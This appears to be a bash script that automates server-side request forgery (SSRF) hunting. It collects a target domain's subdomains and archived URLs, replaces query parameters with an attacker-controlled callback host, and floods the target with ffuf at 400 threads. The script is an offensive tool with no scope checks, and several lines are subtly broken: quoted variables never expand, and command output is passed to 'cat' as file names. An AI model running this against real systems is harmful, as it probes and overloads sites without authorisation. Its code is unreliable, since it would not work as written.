#!/bin/bash


while getopts :d:c: fname; do

        case $fname in
                d) TARGET=$OPTARG;;
				c) collaborator=$OPTARG;;
                *) echo "Invalid Operation $OPTARG";;
        esac
done


SUB_FINDER="$(subfinder -d $TARGET -silent | httpx -silent)"



ASS_FINDER="$(assetfinder --subs-only $TARGET | httpx -silent)"



CERT="$(curl -sk 'https://crt.sh/?q=$TARGET' | grep -oE '[a-zA-Z0-9._-]+\.$TARGET' | sed -e '/[A-Z]/d' -e '/*/d' | grep -oP '[a-z0-9]+\.[a-z]+\.[a-z]+' | httpx -silent)"


ALL_SUBS="$(cat $SUB_FINDER $ASS_FINDER $CERT | sort -u )"


GAO="$(gau -subs $TARGET)"



WAY="$(waybackurls $TARGET)"



ALL_WAY="$(cat $ALL_SUBS | waybackurls)"



GOSP="$(gospider -q -S $ALL_SUBS -c 10 -d 1)"


ALLIVE="$(cat $GAO $WAY $ALL_WAY $GOSP | sort -u | httpx -silent)"


cat $ALLIVE | grep "=" | grep "?" | qsreplace 'http://$collaborator' >> ssrfuzz.txt


ffuf -c -w ssrfuzz.txt -u FUZZ -t 400


echo "KINDLY CHECK FOR HITS ON YOUR SERVER"
